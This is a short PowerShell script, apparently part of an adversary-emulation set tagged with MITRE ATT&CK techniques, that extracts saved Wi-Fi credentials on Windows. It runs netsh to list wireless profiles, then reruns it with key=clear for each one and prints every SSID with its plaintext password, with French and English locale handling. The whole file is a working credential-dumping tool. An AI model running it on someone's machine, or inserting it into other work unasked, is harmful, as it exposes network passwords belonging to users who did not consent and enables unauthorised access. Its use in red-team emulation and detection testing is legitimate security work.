<#
    T1555 - Credentials from Password Stores
    T1049 - System Network Connections Discovery
    T1016 - System Network Configuration Discovery
    Simple script using netsh to extract stored Wifi password on the system
#>

try{
    $language = (Get-UICulture).Name
    if($language -like "*fr-*"){
        $stringprofil = '*Tous les utilisateurs*'
        $stringkey = 'Contenu de la cl'
    }
    elseif($language -like "en-*"){
        $stringprofil = "*All User Profile*"
        $stringkey = "Key Content"
    }

    $profiles = (Invoke-Expression 'netsh.exe wlan show profiles' | Select-String $stringprofil.Replace('*',''))
    if($profiles){
        Write-Host -ForegroundColor Cyan "Saved Wifi Network profiles found"
        $profiles = $profiles -split ':'
        $ssids = foreach ($profile in $profiles) {
            if ($profile -notlike $stringprofil) {
                $profile.Trim()
            }
        }
        $passwords = @()
        foreach ($ssid in $ssids) {
            $password = Invoke-Expression "netsh.exe wlan show profiles name='$ssid' key=clear" | Select-String $stringkey
            $password = ([string]$password -split ': ')[1]
            $addcontent = "ssid: $ssid, password: $password"
            $passwords += $addcontent
        }
        if($passwords){
            Write-Host -ForegroundColor Green "Success: Wifi Passwords extracted:`n"
            $passwords
        }
        else{
            Write-Host -ForegroundColor Red "Error: No Wifi passwords have been found."
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: No saved Wifi Network profiles found"
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: an error occured $_"
}
